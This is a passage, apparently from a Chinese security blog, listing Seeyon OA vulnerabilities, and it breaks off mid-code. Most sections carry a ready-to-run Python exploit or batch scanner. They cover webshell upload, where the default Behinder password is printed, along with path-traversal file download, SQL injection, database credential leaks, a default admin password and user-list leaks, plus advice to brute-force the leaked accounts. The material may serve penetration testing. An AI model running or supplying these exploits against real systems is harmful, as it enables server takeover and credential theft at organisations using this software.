2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00"</span></span><br><span class="line">    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">    response = requests.post(url=vuln_url_2, headers=headers, data=data, verify=<span class="literal">False</span>)</span><br><span class="line">    test_webshell(target_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_webshell</span>(<span class="params">target_url</span>):</span><br><span class="line">    webshell_url = target_url + <span class="string">"/seeyon/apps_res/addressbook/images/config.jspx"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=webshell_url, timeout=<span class="number">10</span>, verify=<span class="literal">False</span>, headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[32m[o] 正在请求 : {}/seeyon/apps_res/addressbook/images/config.jspx\033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {} 成功上传 webshell : {}/seeyon/apps_res/addressbook/images/config.jspx\033[0m"</span>.<span class="built_in">format</span>(target_url,target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] webshell地址：{}/seeyon/apps_res/addressbook/images/config.jspx \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 冰蝎3默认马 pass ：rebeyond \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标漏洞无法利用，写入失败 \033[0m"</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标漏洞无法利用，写入失败 {} \033[0m"</span>.<span class="built_in">format</span>(e))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="【CNVD-2020-62422】致远OA-webmail-do任意文件下载漏洞"><a href="#【CNVD-2020-62422】致远OA-webmail-do任意文件下载漏洞" class="headerlink" title="【CNVD-2020-62422】致远OA webmail.do任意文件下载漏洞"></a>【CNVD-2020-62422】致远OA webmail.do任意文件下载漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息。</p>
<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>致远OA A6-V5</p>
<p>致远OA A8-V5</p>
<p>致远OA G6</p>
<h3 id="复现过程-2"><a href="#复现过程-2" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问URL<code>/seeyon/webmail.do?method=doDownloadAtt&amp;filename=test.txt&amp;filePath=../conf/datasourceCtp.properties</code>，如果下载 <strong>datasourceCtp.properties</strong> 配置文件，存在漏洞。</p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225638.png"></p>
</li>
<li><p>更改参数 filePath 可下载其他文件</p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA多个版本                                              \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                           \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/seeyon/webmail.do?method=doDownloadAtt&amp;filename=test.txt&amp;filePath=../conf/datasourceCtp.properties"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"workflow"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标{}存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 响应为:\n{} \033[0m"</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 文件请求失败 \033[0m"</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="致远OA-A6-setextno-jsp-SQL注入漏洞"><a href="#致远OA-A6-setextno-jsp-SQL注入漏洞" class="headerlink" title="致远OA A6 setextno.jsp SQL注入漏洞"></a>致远OA A6 setextno.jsp SQL注入漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A6 setextno.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器</p>
<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA A6</p>
<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>漏洞URL为<code>/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp</code></p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225757.png"></p>
</li>
<li><p>访问如下URL测试SQL注入<code>/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#</code></p>
<p> <img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225903.png"></p>
<p>分机号显示4，存在SQL注入</p>
</li>
<li><p>查看版本和用户显示如下</p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912225925.png"></p>
</li>
<li><p>接着可以利用into file写入webshell，由于使用的是真实系统，不进行写Webshell。</p>
</li>
</ol>
<h2 id="致远OA-A6-createMysql-jsp-数据库敏感信息泄露"><a href="#致远OA-A6-createMysql-jsp-数据库敏感信息泄露" class="headerlink" title="致远OA A6 createMysql.jsp 数据库敏感信息泄露"></a>致远OA A6 createMysql.jsp 数据库敏感信息泄露</h2><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A6 存在数据库敏感信息泄露，攻击者可以通过访问特定的URL获取数据库账户以及密码MD5。</p>
<h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA A6</p>
<h3 id="复现流程-1"><a href="#复现流程-1" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>访问如下URL，可以读取数据库账户以及密码MD5，相当于执行了SQL语句<code>select * from mysql.user; </code></p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230101.png"></p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A6                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/yyoa/createMysql.jsp"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[36m[o] 正在请求 {}/yyoa/createMysql.jsp..... \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'root'</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[36m[o] 响应为:{}\n \033[0m"</span>.<span class="built_in">format</span>(response.text))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败\033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230143.png"></p>
</li>
</ol>
<h2 id="致远OA-A8-状态监控页面信息泄露"><a href="#致远OA-A8-状态监控页面信息泄露" class="headerlink" title="致远OA A8 状态监控页面信息泄露"></a>致远OA A8 状态监控页面信息泄露</h2><h3 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A8-m 存在状态监控页面信息泄露，攻击者可以从其中获取网站路径和用户名等敏感信息进一步攻击。</p>
<h3 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h3><p>致远OA A8-m</p>
<h3 id="复现过程-3"><a href="#复现过程-3" class="headerlink" title="复现过程"></a>复现过程</h3><ol>
<li><p>访问监控页面URL<code>/seeyon/management/status.jsp</code></p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230208.png"></p>
</li>
<li><p>使用默认后台密码 <strong>WLCCYBD@SEEYON</strong>进行登录后可通过如下URL获取敏感信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/seeyon/management/status.jsp</span><br><span class="line">/seeyon/logs/login.log</span><br><span class="line">/seeyon/logs/v3x.log</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230249.png"></p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230313.png"></p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230351.png"></p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A8 m                                                \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mFile         &gt;&gt;&gt; ip.txt                                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/seeyon/management/index.jsp"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">"Password"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {} 存在后台监控地址{}，默认密码为: WLCCYBD@SEEYON\033[0m"</span>.<span class="built_in">format</span>(target_url, vuln_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {}不存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {} 请求失败 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Scan</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">"r"</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">"http"</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + url</span><br><span class="line">            url = url.strip(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求报错 \033[0m"</span>.<span class="built_in">format</span>(e))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230424.png"></p>
</li>
</ol>
<h2 id="致远OA-A6-DownExcelBeanServlet-用户敏感信息泄露"><a href="#致远OA-A6-DownExcelBeanServlet-用户敏感信息泄露" class="headerlink" title="致远OA A6 DownExcelBeanServlet 用户敏感信息泄露"></a>致远OA A6 DownExcelBeanServlet 用户敏感信息泄露</h2><h3 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息</p>
<h3 id="漏洞影响-2"><a href="#漏洞影响-2" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA A6</p>
<h3 id="复现流程-2"><a href="#复现流程-2" class="headerlink" title="复现流程"></a>复现流程</h3><ol>
<li><p>访问如下URL<code>yyoa/DownExcelBeanServlet?contenttype=username&amp;contentvalue=&amp;state=1&amp;per_id=0</code>即可跳转下载用户信息文件</p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230509.png"></p>
<p>可以再利用得到的用户名使用弱口令爆破进入OA进一步攻击</p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[34mVersion: 致远OA A6                                              \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36m使用格式:  python3 poc.py                                            \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m'</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">"/yyoa/DownExcelBeanServlet?contenttype=username&amp;contentvalue=&amp;state=1&amp;per_id=0"</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"@"</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[32m[o] 目标 {}存在漏洞! \n下载地址:{} \033[0m"</span>.<span class="built_in">format</span>(target_url, vuln_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\033[31m[x] 目标 {}不存在漏洞 \033[0m"</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求失败 \033[0m"</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Scan</span>(<span class="params">file_name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">"r"</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> scan_url:</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> scan_url:</span><br><span class="line">            <span class="keyword">if</span> url[:<span class="number">4</span>] != <span class="string">"http"</span>:</span><br><span class="line">                url = <span class="string">"http://"</span> + url</span><br><span class="line">            url = url.strip(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"\033[31m[x] 请求报错 \033[0m"</span>.<span class="built_in">format</span>(e))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230542.png"></p>
</li>
</ol>
<h2 id="致远OA-A6-initDataAssess-jsp-存在用户敏感信息泄露"><a href="#致远OA-A6-initDataAssess-jsp-存在用户敏感信息泄露" class="headerlink" title="致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露"></a>致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露</h2><h3 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露，可以通过得到的用户名爆破用户密码进入后台进一步攻击</p>
<h3 id="漏洞影响-3"><a href="#漏洞影响-3" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>致远OA A6</p>
<h3 id="9-3-复现流程"><a href="#9-3-复现流程" class="headerlink" title="9.3. 复现流程"></a>9.3. 复现流程</h3><ol>
<li><p>访问如下URL<code>/yyoa/assess/js/initDataAssess.jsp</code>泄漏用户信息</p>
<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20220912230632.png"></p>
<p>可以再利用得到的用户名使用弱口令爆破进入OA进一步攻击</p>
</li>
<li><p>漏洞利用POC</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span 